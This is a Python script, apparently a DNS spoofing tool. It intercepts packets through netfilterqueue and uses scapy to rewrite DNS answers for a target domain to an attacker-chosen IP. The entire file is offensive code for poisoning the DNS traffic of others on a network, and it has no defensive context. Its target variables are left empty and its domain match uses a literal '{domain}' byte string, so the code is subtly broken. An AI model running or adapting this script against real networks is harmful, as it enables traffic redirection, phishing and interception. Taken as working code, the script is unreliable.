import netfilterqueue
import scapy.all as scapy
import signal
import sys
from termcolor import colored

def def_handler(signum, frame):
    print(colored(f"[!] Exiting...", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    domain = ''
    ip = ''

    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname

        if b"{domain}" in qname:
            print(colored(f"[+] Poisoning {qname} domain", "green"))
            answer = scapy.DNSRR(rrname=qname, rdata=ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(scapy_packet.build())

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0)
queue.run()
